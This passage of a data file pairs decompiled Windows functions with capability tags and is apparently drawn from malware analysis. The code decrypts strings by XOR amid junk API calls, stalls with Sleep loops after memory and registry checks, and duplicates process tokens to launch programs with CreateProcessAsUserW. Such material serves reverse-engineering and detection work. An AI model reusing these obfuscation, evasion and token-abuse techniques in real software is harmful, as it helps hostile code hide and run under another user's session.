(&stack0xfffffaf8)[iVar9 % iStack1176] ^ (iVar9 + iVar7)[puStack1292];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0xd);\n    puStack1360 = 0x15;\n    uStack1364 = 8;\n    uStack1363 = 0;\n    uStack1361 = 0;\n    iStack1332 = 0x2c422e1d;\n    uStack1328 = 0x3d33180f;\n    uStack1324 = 0x1f173153;\n    pcStack1320 = 0x2b5b2e2e;\n    uStack1316 = 0x4b350a00;\n    uStack1368 = 0xd8;\n    uStack1367 = 0x8b;\n    uStack1366 = 0x40;\n    uStack1365 = 0;\n    uVar5 = (*pcVar2)();\n    uStack1368 = uVar5;\n    uStack1367 = uVar5 >> 8;\n    uStack1366 = uVar5 >> 0x10;\n    uStack1365 = uVar5 >> 0x18;\n    uStack1372 = 0xdf;\n    uStack1371 = 0x8b;\n    uStack1370 = 0x40;\n    uStack1369 = 0;\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack1180 = 6;\n    iVar9 = 0;\n    puStack1304 = &stack0xfffffac0 + -iVar7;\n    iStack1300 = iVar7;\n    do {\n        uStack1372 = 4;\n        uStack1371 = 0x8c;\n        uStack1370 = 0x40;\n        uStack1369 = 0;\n        iVar4 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar4 != 0x42dddc) {\n            *(iVar9 + iVar7) = (&stack0xfffffab8)[iVar9 % iStack1180] ^ (iVar9 + iVar7)[puStack1304];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x14);\n    uStack1372 = iVar7;\n    uStack1371 = iVar7 >> 8;\n    uStack1370 = iVar7 >> 0x10;\n    uStack1369 = iVar7 >> 0x18;\n    uStack1376 = uStack1172;\n    uStack1380 = 0x408c3a;\n    uStack1380 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    puStack1384 = 0x408c41;\n    puStack1304 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    puStack1384 = &stack0xfffffb6c;\n    uStack1172 = 0x40;\n    uStack1388 = 0x408c5e;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    uStack1388 = 0xbd;\n    uStack1392 = 8;\n    puStack1304 = 0x4a0c350c;\n    iStack1300 = 0x6d514428;\n    uStack1296 = 0x35255a3d;\n    puStack1292 = 0x443f4a1f;\n    uStack1288 = 0x5a0e6d69;\n    uStack1284 = 0x4a3e3501;\n    uStack1280 = 0x6d674419;\n    uStack1276 = 0x35145a03;\n    uStack1272 = 0x44134a39;\n    uStack1268 = 0x5a046d7a;\n    uStack1264 = 0x4a3e3518;\n    uStack1260 = 0x6d464423;\n    iStack1256 = 0x35215a3e;\n    uStack1252 = 0x4a00;\n    uStack1250 = 6;\n    uStack1249 = 0x2f6d7644;\n    uStack1245 = 0x19352a5a;\n    uStack1241 = 0x5444284a;\n    uStack1237 = 0x145a266d;\n    uStack1233 = 0x354a1f35;\n    uStack1229 = 0x2f6d5644;\n    uStack1225 = 0x1e35375a;\n    uStack1221 = 0x4744354a;\n    uStack1217 = 0x745a166d;\n    uStack1213 = 0x35;\n    uStack1212 = 0x6d;\n    uStack1211 = 0x4a;\n    uStack1368 = 0x44;\n    uStack1367 = 0x35;\n    uStack1366 = 0x6d;\n    uStack1365 = 0x4a;\n    uStack1364 = 0x5a;\n    uStack1396 = 0x408d6e;\n    uStack1396 = (*pcVar2)();\n    puStack1400 = 0x408d75;\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    puVar10 = &stack0xfffffadc + -iVar7;\n    iVar9 = 0;\n    uStack1212 = SUB41(puVar10, 0);\n    uStack1211 = puVar10 >> 8;\n    uStack1210 = puVar10 >> 0x10;\n    iStack1332 = iVar7;\n    do {\n        puStack1400 = NULL;\n        uStack1404 = 0x408d93;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        if (iVar4 != 0xcd7f4f) {\n            *(iVar9 + iVar7) =\n                 (&stack0xfffffa9c)[iVar9 % CONCAT13(uStack1213, uStack1217._1_3_)] ^\n                 (iVar9 + iVar7)[CONCAT22(uStack1210, CONCAT11(uStack1211, uStack1212))];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x5e);\n    if (pcStack1320 == NULL) {\n        puStack1400 = &stack0xfffffba0;\n        uStack1404 = 0x408de2;\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        puStack1400 = &stack0xfffffba0;\n        uStack1404 = 0x408dd2;\n        (*pcStack1320)();\n    }\n    uStack1404 = 0x15;\n    uStack1408 = 8;\n    uStack1376 = 0x4700696c;\n    uStack1372 = 5;\n    uStack1371 = 0x45;\n    uStack1370 = 0x5a;\n    uStack1369 = 0x69;\n    uStack1368 = 0x65;\n    uStack1367 = 0x47;\n    puStack1384 = 0x47656934;\n    uStack1380 = CONCAT22(uStack1380._2_2_, 0x456a);\n    uStack1412 = 0x408e13;\n    uStack1412 = (*pcVar2)();\n    puStack1416 = 0x408e1a;\n    uVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar7 = 0;\n    uStack1229 = uStack1229 & 0xff | uVar6 << 8;\n    uStack1225 = uStack1225 & 0xffffff00 | uVar6 >> 0x18;\n    do {\n        puStack1416 = 0x408e39;\n        iVar9 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        puVar10 = puStack1348;\n        if (iVar9 != 0x9b862f) {\n            *(iVar7 + uVar6) =\n                 (&stack0xfffffa8c)[iVar7 % CONCAT13(uStack1221, uStack1225._1_3_)] ^\n                 (iVar7 + uVar6)[&stack0xfffffa94 + -uVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    puStack1416 = &stack0xfffffb3c;\n    puStack1420 = puStack1348;\n    iVar7 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)(reloc.WS2_32.dll_bind);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar7 == 0) {\n        puStack1400 = 0x6a167227;\n        iVar9 = 0;\n        uStack1396 = 0x64117717;\n        uStack1392 = 0x7204780f;\n        uStack1388 = 0x77176a17;\n        puStack1384 = 0x78246400;\n        uStack1380 = 0x6a097216;\n        uStack1376 = 0x6421771d;\n        uStack1372 = 0x1e;\n        uStack1371 = 0x78;\n        uStack1370 = 5;\n        uStack1369 = 0x72;\n        uStack1368 = 0xd;\n        uStack1367 = 0x6a;\n        uStack1366 = 0x16;\n        uStack1365 = 0x77;\n        uStack1364 = 0x15;\n        uStack1363 = 0x6a64;\n        uStack1361 = 0x78;\n        uStack1408 = 0x6a647277;\n        uStack1404 = CONCAT31(uStack1404._1_3_, 0x78);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        puStack1360 = &stack0xfffffa7c + -iVar7;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n            if (iVar4 != 0xb4b787) {\n                *(iVar9 + iVar7) = (&stack0xfffffa74)[iVar9 % iStack1256] ^ (iVar9 + iVar7)[&stack0xfffffa7c + -iVar7];\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x28);\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                  (CONCAT13(uStack1241, uStack1245._1_3_), iVar7, 0, 0, &stack0xfffffb9c, &stack0xfffffb30);\n        uVar6 = uStack1276;\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        piVar8 = &stack0xfffffb84;\n        do {\n            iVar1 = *piVar8;\n            piVar8 = piVar8 + 1;\n        } while (iVar1 != uStack1260);\n        if (piVar8 - &stack0xfffffb86 >> 1 != 0) {\n            while (iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffb84, uVar6),  iVar9 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack1268);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar2)(uVar5);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        puVar10 = puStack1360;\n    }\n    while ((_sym.imp.KERNEL32.dll_GetProcessHeap = pcVar3,  iStack1204 == 0 && (uStack1208 < 2100000000))) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    uVar5 = (*pcVar3)(0, uVar6);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, puVar10);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, uStack1380);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, uStack1264);\n    (*pcVar2)(uVar5);\n    return;\n}\n",
        "token_count": 4075
    },
    "0040935e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040935e(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_38h;\n    uint var_34h;\n    ushort var_30h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    uint var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *hHeap;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    iVar6 = -0x3fffffdd;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (hHeap = param_1[1],  hHeap != NULL)) {\n        if (*param_1 == *hHeap) {\n            var_38h = 0x17234739;\n            var_34h._0_1_ = 0x3f;\n            var_8h = 6;\n            var_34h._1_1_ = 6;\n            var_34h._2_2_ = 0x5e04;\n            var_30h = 0x213f;\n            var_2eh._0_2_ = 0x163f;\n            var_2eh._2_2_ = 0x7118;\n            var_2ah._0_2_ = 0x353a;\n            var_2ah._2_2_ = 0x3c;\n            var_26h._0_2_ = 0x3319;\n            stack0xffffffd8 = 0x534f336b;\n            var_20h._0_2_ = 0x655a;\n            var_1ch = param_2;\n            var_18h = param_1;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar7 = 0;\n            var_10h = &var_38h - iVar6;\n            var_14h = iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                if (iVar4 != 0x19a0fd) {\n                    *(iVar7 + iVar6) = *(&var_26h + iVar7 % var_8h + 2) ^ (iVar7 + iVar6)[var_10h];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x14);\n            var_30h = 0x153f;\n            var_2eh._0_2_ = 0x342e;\n            var_2eh._2_2_ = 0x7a39;\n            var_2ah._0_2_ = 0xd35;\n            var_2ah._2_2_ = 0x5826;\n            stack0xffffffd8 = 0x584a6151;\n            var_20h._0_2_ = 0x5455;\n            uVar3 = (*pcVar1)(8, 0xb);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            var_10h = &var_30h - iVar7;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                iVar4 = var_14h;\n                if (iVar5 != 0x4733ae) {\n                    *(iVar6 + iVar7) = *(&var_26h + iVar6 % var_8h + 2) ^ (iVar6 + iVar7)[var_10h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar7, var_14h);\n            var_14h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            uVar3 = (*pcVar1)(8, hHeap[1]);\n            var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = *hHeap;\n            var_18h = var_18h[1] + 0xc;\n            fcn.004092cc();\n            piVar2 = hHeap;\n            iVar6 = (*var_14h)(2, var_8h, hHeap[1], var_18h, iVar6 + -0xc, &var_ch);\n            hHeap = iVar6;\n            if (iVar6 == 0) {\n                if (var_ch == piVar2[1]) {\n                    var_1ch[1] = var_8h;\n                    *var_1ch = var_ch;\n                }\n                else {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    iVar6 = -0x3fffff85;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n            pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*pcVar1)(uVar3);\n        }\n        else {\n            iVar6 = -0x3fffff85;\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 1353
    },
    "0040a096": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040a096(int32_t param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    uint var_e0h;\n    int32_t var_d8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint TokenHandle;\n    uint pSessionId;\n    int32_t ProcessHandle;\n    uint hExistingToken;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t *var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t lpApplicationName;\n    uint hObject;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_64h = 4;\n    var_70h._0_2_ = 0x1000;\n    piVar6 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar6 = 0;\n        piVar6 = piVar6 + 1;\n    }\n    puVar7 = &var_e0h;\n    var_60h = param_2;\n    lpApplicationName = param_1;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    pSessionId = 0;\n    puVar7 = &var_98h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    hObject = 0;\n    hExistingToken = 0;\n    var_5ch = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    var_38h = 0x1622330d;\n    var_34h = 0x62650a26;\n    var_30h = 0x3a0a2756;\n    var_2ch._0_1_ = 0x50;\n    var_48h = 0x78505666;\n    var_44h._0_1_ = 0x43;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_58h = 5;\n    iVar8 = 0;\n    var_8ch = iVar4;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar3 != 0xba32d9) {\n            *(iVar8 + iVar4) = *(&var_48h + iVar8 % var_58h) ^ (iVar8 + iVar4)[&var_38h - iVar4];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xd);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (ProcessHandle != 0) {\n        var_38h = 0x1622330d;\n        var_34h = 0x62650a26;\n        var_30h = 0x3a0a2756;\n        var_2ch._0_1_ = 0x50;\n        var_48h = 0x78505666;\n        var_44h._0_1_ = 0x43;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar4 = 0;\n        var_6ch = iVar8;\n        var_54h = &var_38h - iVar8;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            if (iVar3 != 0xba32d9) {\n                *(iVar4 + iVar8) = *(&var_48h + iVar4 % var_58h) ^ (iVar4 + iVar8)[&var_38h - iVar8];\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0xd);\n        iVar4 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(lpApplicationName, &pSessionId);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar4 != 0) {\n            var_24h = 0x20033817;\n            var_20h = 0x1352b0f;\n            var_1ch = 0x292d192c;\n            var_18h = 0x3f041c3f;\n            var_14h = 0xb382023;\n            var_10h = 0x3b3d252d;\n            var_ch._0_1_ = 0x6a;\n            var_8h = 0x55524c59;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6a);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar8 = 0;\n            var_54h = &var_24h - iVar4;\n            var_48h = iVar4;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                if (iVar3 != 0xab03f0) {\n                    *(iVar8 + iVar4) = *(&var_8h + iVar8 % var_58h) ^ (iVar8 + iVar4)[&var_24h - iVar4];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x19);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            iVar8 = var_6ch;\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar3 != 0) {\n                fcn.0040b30d();\n                iVar3 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hObject);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar3 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hObject, 0xc, pSessionId, 4);\n                    iVar8 = 0;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_94h = 0x20;\n                        var_98h = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hObject, 0x19, &var_98h, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_90h = 0;\n                    (*pcVar1)(hObject, 0x1b, &var_90h, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_5ch, hObject, 1);\n                    if (iVar4 == 0) {\n                        var_5ch = 0;\n                    }\n                    else {\n                        var_64h = 0x404;\n                    }\n                    var_e0h = 0x44;\n                    var_28h = 0x4a5e6115;\n                    var_24h = 0x61113328;\n                    var_20h = 0x33274a43;\n                    var_1ch = 0x4a6b6152;\n                    var_18h = 0x61073322;\n                    var_14h = 0x33274a51;\n                    var_10h = 0x4a5b6117;\n                    var_ch._0_1_ = 0x32;\n                    var_ch._1_1_ = 0x33;\n                    var_ch._2_2_ = 0x6162;\n                    var_8h = 0x4a376162;\n                    var_4h._0_2_ = 0x3346;\n                    uVar2 = (*pcVar5)(8, 0x41);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    var_40h = 6;\n                    var_54h = iVar4;\n                    lpApplicationName = &var_28h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                        if (iVar3 != 0x9d07c1) {\n                            *(iVar8 + iVar4) = *(&var_8h + iVar8 % var_40h) ^ (iVar8 + iVar4)[&var_28h - iVar4];\n                        }\n                        iVar8 = iVar8 + 1;\n                    } while (iVar8 < 0x20);\n                    var_20h = 0x4d475823;\n                    var_1ch = 0x58385032;\n                    var_18h = 0x50224d5e;\n                    var_14h = 0x4d1f5824;\n                    var_10h = 0x58285034;\n                    var_ch._0_1_ = 0x54;\n                    var_ch._1_1_ = 0x4d;\n                    var_ch._2_2_ = 0x5051;\n                    var_8h = 0x4d315850;\n                    var_4h._0_2_ = 0x5051;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar8 = 0;\n                    var_68h = &var_20h - iVar4;\n                    lpApplicationName = iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        if (iVar3 != 0x17fe88) {\n                            *(iVar8 + iVar4) = *(&var_8h + iVar8 % var_40h) ^ (iVar8 + iVar4)[&var_20h - iVar4];\n                        }\n                        iVar8 = iVar8 + 1;\n                    } while (iVar8 < 0x18);\n                    var_d8h = var_54h;\n                    var_b0h._0_2_ = 0;\n                    var_b4h = 1;\n                    var_1ch = 0x7a7f705b;\n                    var_18h = 0x705b540a;\n                    var_14h = 0x54597a76;\n                    var_10h = 0x7a29705c;\n                    var_ch._0_1_ = 0x79;\n                    var_ch._1_1_ = 0x54;\n                    var_34h = 0x7a5a7079;\n                    var_30h = CONCAT22(var_30h._2_2_, 0x5479);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar8 = 0;\n                    var_68h = iVar4;\n                    var_8h = &var_1ch - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                        if (iVar3 != 0x241b38) {\n                            *(iVar8 + iVar4) = *(&var_34h + iVar8 % var_40h) ^ (iVar8 + iVar4)[&var_1ch - iVar4];\n                        }\n                        iVar8 = iVar8 + 1;\n                    } while (iVar8 < 0x12);\n                    iVar8 = 0;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hObject, lpApplicationName, 0, 0, 0, 0, var_64h, var_5ch, 0, &var_e0h, var_60h);\n                    var_1ch = 0x7141421b;\n                    var_18h = 0x3037635b;\n                    var_14h = 0x420a3506;\n                    var_10h = 0x635a715e;\n                    var_ch._0_1_ = 0x42;\n                    var_ch._1_1_ = 0x30;\n                    var_40h = 0x71304263;\n                    var_3ch._0_1_ = 0x35;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    var_64h = iVar4;\n                    var_8h = &var_1ch - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n                        if (iVar3 != 0x5556e3) {\n                            *(iVar8 + iVar4) = *(&var_40h + iVar8 % var_58h) ^ (iVar8 + iVar4)[&var_1ch - iVar4];\n                        }\n                        iVar8 = iVar8 + 1;\n                    } while (iVar8 < 0x12);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if (*var_60h != 0) {\n                        var_38h = 0x2b2a3e18;\n                        var_34h = 0x292e2456;\n                        var_30h = CONCAT22(var_30h._2_2_, 0x3714);\n                        var_40h = 0x79464a4a;\n                        var_3ch._0_1_ = 0x37;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        iVar4 = 0;\n                        var_8h = &var_38h - iVar8;\n                        do {\n                            iVar3 = (*_sym.imp.USER32.dll_GetMessagePos)();\n                            if (iVar3 != 0xf7f2a) {\n                                *(iVar4 + iVar8) = *(&var_40h + iVar4 % var_58h) ^ (iVar4 + iVar8)[&var_38h - iVar8];\n                            }\n                            iVar4 = iVar4 + 1;\n                        } while (iVar4 < 10);\n                        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*var_60h, 0x201eb, &TokenHandle);\n                        iVar4 = var_64h;\n                        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (iVar3 != 0) {\n                            fcn.0040b30d();\n                            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n                        }\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_60h[1]);\n                        uVar2 = (*pcVar5)(0, iVar8);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    }\n                    iVar8 = var_68h;\n                    if (var_5ch != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_5ch);\n                    }\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n                    uVar2 = (*pcVar5)(0, iVar4);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    uVar2 = (*pcVar5)(0, iVar8);\n                    (*pcVar1)(uVar2);\n                    uVar2 = (*pcVar5)(0, lpApplicationName);\n                    (*pcVar1)(uVar2);\n                    uVar2 = (*pcVar5)(0, var_54h);\n                    (*pcVar1)(uVar2);\n                    iVar4 = var_48h;\n                    iVar8 = var_6ch;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(hExistingToken);\n            }\n            uVar2 = (*pcVar5)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        iVar4 = var_8ch;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(ProcessHandle);\n        uVar2 = (*pcVar5)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    iVar8 = *var_60h;\n    uVar2 = (*pcVar5)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return iVar8;\n}\n",
        "token_count": 4171
    },
    "0040ca9b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040ca9b(void)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    code *var_10h;\n    int32_t lpModuleName;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_40h._0_1_ = 0xd;\n    var_40h._1_1_ = 0x33;\n    var_40h._2_2_ = 0x1622;\n    var_3ch._0_2_ = 0xa26;\n    var_3ch._2_1_ = 0x65;\n    var_3ch._3_1_ = 0x62;\n    var_38h._0_1_ = 0x56;\n    var_38h._1_2_ = 0xa27;\n    var_38h._3_1_ = 0x3a;\n    var_34h._0_1_ = 0x50;\n    var_28h = 0x78505666;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x43);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    lpModuleName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar4 != 0xba32d9) {\n            var_18h = 5;\n            *(iVar8 + iVar3) = *(&var_28h + iVar8 % 5) ^ (iVar8 + iVar3)[&var_40h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xd);\n    var_3ch._0_2_ = 0x5e77;\n    var_18h = 1;\n    var_3ch._2_1_ = 1;\n    var_3ch._3_1_ = 7;\n    var_38h._0_1_ = 0x72;\n    var_38h._1_2_ = 0x5e3c;\n    var_38h._3_1_ = 0x5a;\n    var_34h._0_1_ = 0x2e;\n    var_34h._1_1_ = 99;\n    var_28h = 0x636f3731;\n    var_24h._0_2_ = 0x4833;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 6;\n    iVar8 = 0;\n    var_10h = &var_3ch - iVar3;\n    var_14h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar4 != 0xb5a693) {\n            *(iVar8 + 